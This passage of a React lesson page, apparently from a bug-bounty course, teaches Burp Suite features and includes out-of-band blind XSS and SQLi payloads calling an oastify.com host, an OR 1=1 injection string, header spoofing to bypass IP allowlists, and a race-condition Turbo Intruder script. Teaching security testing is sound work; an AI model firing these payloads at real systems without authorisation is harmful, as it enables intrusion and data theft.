                  <li><b>Blind XSS</b>: inject <code>&lt;script src=https://x.oastify.com/x.js&gt;</code> — wait for an admin to open the page.</li>
                  <li><b>Blind SQLi</b>: <code>'; SELECT load_file('\\\\\\\\x.oastify.com\\\\share') --</code></li>
                  <li><b>Blind XXE</b>: external entity pointing at Collaborator.</li>
                  <li><b>SSRF</b>: replace any URL in a request with a fresh subdomain.</li>
                  <li><b>Email injection</b>: drop an SMTP probe into the email field.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Scanner & BCheck — smart automated scanning (Pro)">
              <p className="opacity-90">
                The built-in Scanner is good, but the secret weapon is <b>BCheck</b> — a DSL for writing custom checks.
                Write once, run on every bug-bounty program.
              </p>
              <Code lang="text">{`metadata:
    language: v2-beta
    name: "Detect debug.php"
    description: "Send /debug.php and check the response"
    author: "you"

run for each:
    debug_path =
        "/debug.php",
        "/debug.html",
        "/.env"

given any host then
    send request called check:
        method: "GET"
        path: \`{debug_path}\`
    if {check.response.status_code} is "200" and
       {check.response.body} matches "DB_PASSWORD" then
        report issue:
            severity: high
            confidence: certain
            detail: \`Sensitive file at {debug_path}\`
    end if`}</Code>
              <p className="opacity-80 mt-2">
                BChecks live in <code>~/AppData/Roaming/BurpSuite/bchecks/</code>; then Scanner → Issues → BChecks → Reload.
              </p>
            </Section>

            <Section title="Comparer + Decoder + Sequencer">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>Comparer</b>: <i>Words/Bytes</i> diff between two responses. Great for blind boolean — diff the response of <code>id=1</code> and <code>id=1' OR 1=1--</code>.</li>
                <li><b>Decoder</b>: encode/decode in one click — base64, URL, HTML, hex, hash. Stack operations.</li>
                <li><b>Sequencer</b>: token-randomness analysis (session ID, CSRF). Collects 10k+ tokens and computes entropy. Useful for spotting weak RNG.</li>
              </ul>
            </Section>

            <Section title="Match & Replace — a hidden superpower">
              <Code lang="text">{`Proxy → Options → Match and Replace → Add:
Type: Request header
Match: ^User-Agent: .*
Replace: User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
[ ] Regex match`}</Code>
              <ul className="list-disc ps-6 space-y-1 opacity-90 mt-2">
                <li>Bypass bot detection by impersonating Googlebot.</li>
                <li>Inject <code>X-Forwarded-For: 127.0.0.1</code> to bypass IP allowlists.</li>
                <li>Strip <code>Origin</code> to test CORS.</li>
                <li>Auto-replace JWT in every request.</li>
                <li>Inject a debugger statement into every JS response.</li>
              </ul>
            </Section>

            <Section title="Macros & Sessions — for complex workflows">
              <p className="opacity-90">
                The app demands a fresh CSRF token per request? Burp can extract it from a prior response and inject it
                automatically.
              </p>
              <Code lang="text">{`Project options → Sessions → Macros → Add
1) Record: GET /login → extract _csrf from body
2) Session handling rule:
   Scope: matches /api/*
   Action: Run macro to fetch _csrf, then update _csrf parameter`}</Code>
              <p className="opacity-80 mt-2">
                Result: Intruder/Scanner work through CSRF-protected apps with no manual effort.
              </p>
            </Section>

            <Section title="Turbo Intruder — for serious speed and single-packet">
              <Code lang="python">{`# Burp → Extender → Turbo Intruder → New attack
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.BURP2
    )
    # Race condition — single packet
    for i in range(30):
        engine.queue(target.req)
    engine.openGate()

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)`}</Code>
              <p className="opacity-80 mt-2">
                30,000 req/s is reachable. Use it against credential stuffing on your own lab, or race-on-coupon-redemption.
              </p>
            </Section>

            <Section title="Tips top bug-bounty hunters actually use">
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>One project = one file.</b> File → New project → Disk-based. Don't mix targets.</li>
                <li><b>Save every hour.</b> Burp can crash on big projects.</li>
                <li><b>Logger++ on from day one.</b> A week later you'll need to find "where did I see this parameter?"</li>
                <li><b>Annotate Repeater tabs</b>: right-click → Add comment. Speed in writing now = speed in the report later.</li>
                <li><b>Search History with Bambdas</b>: <code>requestResponse.request().urlContains("graphql")</code> → instant filter.</li>
                <li><b>Run Param Miner before anything</b>: it can surface <code>X-Original-URL</code> or hidden header that opens the door.</li>
                <li><b>Don't trust Active Scanner alone.</b> It catches ~30%; the rest is manual.</li>
                <li><b>Save state before any risky try.</b> If you trash the session, restore.</li>
                <li><b>Burp Collaborator always on.</b> A quarter of my real findings were OOB.</li>
                <li><b>Read the release notes for every update.</b> PortSwigger ships killer features (e.g. Inspector) constantly.</li>
              </ol>
            </Section>

            <Section title="Burp alternatives — when and why">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>OWASP ZAP</b>: fully free, excellent CLI for CI/CD, but slower UI than Burp Pro.</li>
                <li><b>Caido</b>: 2024+, Rust, snappier, modern UI. A serious Burp competitor.</li>
                <li><b>mitmproxy</b>: terminal-based, great for Python scripting and mobile.</li>
                <li><b>HTTP Toolkit</b>: more debug-focused, but excellent for mobile/desktop apps.</li>
              </ul>
            </Section>

            <Section title="Mastery resources">
              <ul className="list-disc ps-6 space-y-1 opacity-90">
                <li><b>PortSwigger Web Security Academy</b> — free; teaches Burp and the bugs together.</li>
                <li><b>BApp Store</b> — browse monthly; new extensions ship constantly.</li>
                <li><b>YouTube: PortSwigger Research</b> — James Kettle reveals techniques before they land in Burp.</li>
                <li><b>Twitter / X</b>: follow <code>@albinowax</code>, <code>@Rhynorater</code>, <code>@JHaddix</code>.</li>
              </ul>
            </Section>
          </>
        }
      />
    </LessonShell>
  );
}
